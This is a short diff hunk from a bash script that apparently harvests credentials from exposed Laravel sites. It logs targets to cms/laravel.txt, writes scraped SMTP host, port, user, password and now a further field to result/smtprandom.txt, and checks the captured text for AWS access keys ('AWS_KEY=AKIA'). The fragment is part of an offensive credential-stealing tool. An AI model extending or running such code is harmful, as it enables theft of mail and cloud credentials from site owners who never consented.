@@ -134,7 +134,7 @@ REG1=$(cat ses3.htm | grep -Po "<pre.*>(.*?)<\/span>" | sed 's|</span>|-|g' | se
                 echo "${TARGET}" >> cms/laravel.txt
         else
                 echo -e "${LK}[DEBUG][$tgl] ${NOR} ${TARGET}"
-                echo "${TARGET}|$KTH|$KTP|$KTU|$KTS" >> result/smtprandom.txt
+                echo "${TARGET}|$KTH|$KTP|$KTU|$KTS|$KTF" >> result/smtprandom.txt
                 echo "${TARGET}" >> cms/laravel.txt
  fi
         if [[ $USER1 =~ "AWS_KEY=AKIA" ]];then
